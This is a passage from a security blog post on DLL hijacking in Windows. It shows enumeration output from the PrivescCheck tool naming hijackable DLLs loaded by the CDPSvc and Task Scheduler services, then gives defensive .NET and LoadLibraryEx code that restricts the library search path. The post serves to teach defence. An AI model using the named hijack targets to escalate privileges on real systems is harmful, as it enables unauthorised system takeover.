<p>DLL hijacking could also be used to target Windows services - though very few of them, if at all, are still vulnerable in one way or another. With PrivescCheck, we can find potentially vulnerable services by invoking <code class="language-plaintext highlighter-rouge">Invoke-HijackableDllsCheck</code>. It will list out the services that has hijackable DLLs, what user account will the process be run as when the hijack is complete, and whether or not a reboot is required for the hijack to work.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Still</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-HijackableDllsCheck</span><span class="w">

</span><span class="n">Name</span><span class="w">               </span><span class="nx">Description</span><span class="w">                                       </span><span class="nx">RunAs</span><span class="w">                     </span><span class="nx">RebootRequired</span><span class="w">
</span><span class="o">----</span><span class="w">               </span><span class="o">-----------</span><span class="w">                                       </span><span class="o">-----</span><span class="w">                     </span><span class="o">--------------</span><span class="w">
</span><span class="n">cdpsgshims.dll</span><span class="w">     </span><span class="nx">Loaded</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">CDPSvc</span><span class="w"> </span><span class="nx">upon</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">startup</span><span class="w">             </span><span class="nx">NT</span><span class="w"> </span><span class="nx">AUTHORITY\LocalService</span><span class="w">           </span><span class="nx">True</span><span class="w">
</span><span class="n">WptsExtensions.dll</span><span class="w"> </span><span class="nx">Loaded</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Task</span><span class="w"> </span><span class="nx">Scheduler</span><span class="w"> </span><span class="nx">upon</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">startup</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">                         </span><span class="nx">True</span><span class="w">
</span></code></pre></div></div>

<p>For more details and hands on practices of DLL hijacking, I recommend itm4n’s excellent article regarding DLL hijacking, which can be found in the <a href="#additional-resources">Additional Resources</a> section.</p>

<h2 id="the-solution">The Solution</h2>

<h3 id="net">.NET</h3>

<p><del>You may have noticed my peculiar language/runtime choice for testing DLL hijacking. There is a reason that I chose dotnet over C/C++ here. Here’s the problem - <strong>there is not a single good solution to avoid DLL hijacking when working with dotnet.</strong> At least, not that I can tell. The only method that I can tell is by invoking the <code class="language-plaintext highlighter-rouge">LoadLibrary</code> call directly, as opposed to calling the DLL exports. With <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code>, DLL hijacking can be alleviated to some degree (see below).</del></p>

<p><del>If you do know a good method of preventing dotnet DLL hijacking, please do let me know in the comments.</del></p>

<p>For .NET Core 3.0 and above (inc. .NET 5), <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.nativelibrary?view=netcore-3.1">the use of <code class="language-plaintext highlighter-rouge">System.Runtime.InteropServices.NativeLibrary</code> class</a> is preferred. So, in our case, we can rewrite the application like this to specify that we only want to search within the assembly directory:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">delegate</span> <span class="k">void</span> <span class="nf">UnknownMethod</span><span class="p">();</span>
<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">NativeLibrary</span><span class="p">.</span><span class="nf">TryLoad</span><span class="p">(</span><span class="s">"unknown.dll"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">Program</span><span class="p">).</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">DllImportSearchPath</span><span class="p">.</span><span class="n">AssemblyDirectory</span><span class="p">,</span> <span class="k">out</span> <span class="kt">var</span> <span class="n">entryPointer</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">NativeLibrary</span><span class="p">.</span><span class="nf">TryGetExport</span><span class="p">(</span><span class="n">entryPointer</span><span class="p">,</span> <span class="s">"UnknownMethod"</span><span class="p">,</span> <span class="k">out</span> <span class="kt">var</span> <span class="n">methodPointer</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="kt">var</span> <span class="n">MyUnknownMethod</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">&lt;</span><span class="n">UnknownMethod</span><span class="p">&gt;(</span><span class="n">methodPointer</span><span class="p">);</span>
            <span class="nf">MyUnknownMethod</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Failed to locate the DLL within the application directory."</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>No more exceptions when dealing with <code class="language-plaintext highlighter-rouge">extern</code> with missing DLL or fumbling with DLL search order!</p>

<h3 id="win32-loadlibraryex">Win32 <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code></h3>

<p>In Windows 8 or above (or Windows 7 or below with KB2533623 installed), the <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code> function has a number of new flags that are created specifically to address this issue.</p>

<p>The new flags are <code class="language-plaintext highlighter-rouge">LOAD_LIBRARY_SEARCH_APPLICATION_DIR</code>, <code class="language-plaintext highlighter-rouge">LOAD_LIBRARY_SEARCH_SYSTEM32</code>, <code class="language-plaintext highlighter-rouge">LOAD_LIBRARY_SEARCH_USER_DIRS</code> and more. Additionally, there are flags such as <code class="language-plaintext highlighter-rouge">LOAD_LIBRARY_REQUIRE_SIGNED_TARGET</code>, <code class="language-plaintext highlighter-rouge">LOAD_LIBRARY_SAFE_CURRENT_DIRS</code> to better ensure the integrity of the library before it is loaded. I’m not going to delve into what each flag does here, as they are best explained in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA function (libloaderapi.h)</a> documentation.</p>

<h2 id="additional-resources">Additional Resources</h2>

<p>The following are excellent articles that provide better insights into this type of attack and remedy,</p>

<ul>
  <li><a href="https://stackoverflow.com/questions/45272417/preventing-dll-hijacking-vulnerability-does-not-working-in-c-sharp">Preventing DLL hijacking vulnerability does not working in C#</a></li>
  <li><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/">Windows DLL Hijacking (Hopefully) Clarified</a> by itm4n</li>
  <li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#search-order-for-desktop-applications">Dynamic-Link Library Search Order - Win32 apps</a></li>
  <li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security">Dynamic-Link Library Security - Win32 apps</a></li>
  <li><a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/">Triaging a DLL planting vulnerability - Microsoft Security Response Center</a></li>
  <li><a href="https://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html">Windows 10 - Task Scheduler service - Privilege Escalation/Persistence through DLL planting</a></li>
</ul>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="threat-spotlight" /><category term="en-us" /><category term="dotnet" /><category term="guide" /><summary type="html"><![CDATA[How does Windows determine which DLL to load 🤔?]]></summary></entry></feed>